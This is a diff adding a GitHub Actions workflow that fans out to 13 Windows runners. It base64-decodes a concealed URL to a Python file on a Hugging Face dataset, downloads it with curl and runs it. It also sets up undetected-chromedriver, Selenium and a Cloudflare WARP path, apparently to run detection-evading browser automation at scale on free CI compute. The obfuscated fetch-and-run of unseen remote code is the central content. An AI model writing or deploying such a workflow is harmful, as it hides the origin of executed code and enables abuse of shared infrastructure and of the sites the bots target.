@@ -1,0 +1,69 @@
+name: Parallel Orchestrator Cluster
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: "Runner-${{ matrix.instance_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+
+    steps:
+      - name: System Setup & Fetch Payload
+        shell: bash
+        run: |
+          echo "[INIT] Starting Instance-${{ matrix.instance_index }}..."
+          
+          FETCH_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$FETCH_URI" -o app_runner.py
+          
+          echo "[INIT] Installing required packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[INIT] System environment ready."
+
+      - name: Execute Main Task & Watchdog
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "==> Starting execution on instance ${{ matrix.instance_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ExecutionConfig = @{
+              FilePath     = "python"
+              ArgumentList = "app_runner.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveTask = Start-Process @ExecutionConfig
+          
+          Write-Output "==> Timeout threshold configured for 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $ActiveTask -Timeout 4440 -ErrorAction Stop
+              Write-Output "==> Task completed successfully within timeout."
+          }
+          catch {
+              Write-Output "==> Threshold exceeded. Killing process..."
+              Stop-Process -InputObject $ActiveTask -Force
+              Write-Output "==> Process terminated forcefully."
+          }
+
+      - name: Workflow Termination
+        shell: bash
+        run: echo "[COMPLETE] Instance-${{ matrix.instance_index }} execution task finished."
